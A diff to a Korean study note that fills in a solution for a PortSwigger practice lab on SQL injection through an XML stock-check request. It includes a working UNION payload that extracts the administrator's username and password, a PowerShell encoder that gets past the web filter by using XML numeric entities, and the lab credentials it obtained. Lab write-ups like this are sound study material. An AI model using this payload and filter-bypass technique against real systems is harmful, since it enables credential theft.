@@ -5,7 +5,8 @@ tags:
   - sql-injection
 lab_url: "https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding"
 difficulty: Practitioner
-note_kind: problem
+note_kind: solution
+draft: false
 ---
 
 # SQL injection with filter bypass via XML encoding
@@ -28,20 +29,60 @@ note_kind: problem
 
 ## 탐색 및 풀이 기록
 
-<!-- 아직 이 실습의 재고 확인 요청·응답이나 관리자 로그인을 직접 기록하지 않았다. XML 형식과 필터 동작을 확인한 결과부터 같은 파일에 이어서 적는다. -->
-
 ### 초기 관찰
-<!-- 직접 확인한 내용과 아직 확인하지 못한 점 -->
+
+재고 확인은 `POST /product/stock`으로 XML 본문을 보낸다. `<productId>2</productId>`를 유지하고 `<storeId>`만 바꿔 비교했다.
+
+~~~xml
+<stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
+~~~
+
+`storeId`가 `1`이면 `878 units`, `2`이면 `679 units`였다. `1+1`도 `679 units`를 반환했다. 매장 번호를 단순 문자열이 아닌 식으로 평가한다는 단서다.
 
 ### 실행 과정
-<!-- 무엇을 왜 했는지 → 실제 결과 → 해석 -->
-<!-- 필요할 때 코드·요청·응답·스크린샷 첨부 -->
+
+#### 원문은 차단되고 XML 엔터티는 통과
+
+`<storeId>1 UNION SELECT NULL</storeId>`을 그대로 보내자 HTTP 403과 `"Attack detected"`가 왔다. 같은 문자열의 **각 문자를 16진 XML 숫자 엔터티**로 바꾸어 보내자 HTTP 200과 `878 units` 다음 줄의 `null`이 나왔다. 예를 들어 `U`는 `&#x55;`, 공백은 `&#x20;`로 표현할 수 있다. WAF가 차단한 원문과 달리 인코딩된 XML은 처리됐고, 해석된 값이 SQL 조회에 사용된 것으로 확인했다.
+
+인코딩한 `1 UNION SELECT NULL,NULL`에는 `0 units`가 반환됐다. 한 열을 추가하는 `UNION SELECT NULL`은 출력되고 두 열은 실패했으므로 원래 조회 결과는 **한 열**로 판단했다.
+
+#### 사용자 이름과 비밀번호를 한 열에 합치기
+
+조회 결과가 한 열이므로 `username`과 `password`를 `:`로 연결했다. `administrator` 행만 가져오도록 조건을 걸었다.
+
+~~~sql fragment
+1 UNION SELECT username || ':' || password
+FROM users WHERE username='administrator'
+~~~
+
+PowerShell에서 위 문자열을 문자별 XML 엔터티로 바꾸고 `<storeId>`에 넣었다. 나머지 XML 구조와 `Content-Type: application/xml`은 원래 요청을 유지했다.
+
+~~~powershell
+$sql = "1 UNION SELECT username || ':' || password FROM users WHERE username='administrator'"
+$encoded = -join ($sql.ToCharArray() |
+    ForEach-Object { '&#x{0:X};' -f [int][char]$_ })
+$body = "<stockCheck><productId>2</productId><storeId>$encoded</storeId></stockCheck>"
+~~~
+
+응답은 HTTP 200이었고 재고 수량 아래에 관리자 계정 정보가 추가됐다.
+
+~~~text
+878 units
+administrator:4x6285hvha1pcbgbfht2
+~~~
+
+얻은 비밀번호로 로그인 요청을 보낸 뒤 `/my-account`에서 `Your username is: administrator`를 확인했다. 이어 첫 화면에 실습 완료 배너가 표시됐다.
 
 ## 최종 결과
-<!-- 완료 여부와 확인 근거 -->
+
+XML 숫자 엔터티로 필터를 우회해 한 열짜리 `UNION` 결과에서 관리자 자격 증명을 읽었다. `administrator`로 로그인했고 `Congratulations, you solved the lab!` 배너를 확인했다.
 
 ## 배운 점
-<!-- 새로 알게 된 내용, 잘못 생각했던 부분 -->
+
+이 실습은 결과가 응답에 표시되므로 블라인드 SQL 인젝션과 달리 `UNION` 출력 위치를 바로 활용할 수 있었다. 원문 `UNION SELECT`는 차단됐지만 같은 문자를 XML 엔터티로 표현하면 요청이 통과했다. **필터가 검사하는 표현과 XML 해석 후 SQL에 전달되는 값이 달라질 수 있음**을 정상 재고, 산술식, 차단 응답, 인코딩된 `UNION` 응답으로 구분해 확인했다.
 
 ## 관련 개념
-<!-- 필요한 개념 노트 링크를 목록으로 추가 -->
+
+- [SQL 기초와 SQL 인젝션이 생기는 원리](../../concepts/sql-injection-foundations.md)
+- [UNION 기반 SQL 인젝션으로 테이블과 열 찾기](../../concepts/sql-injection-union-workflow.md)
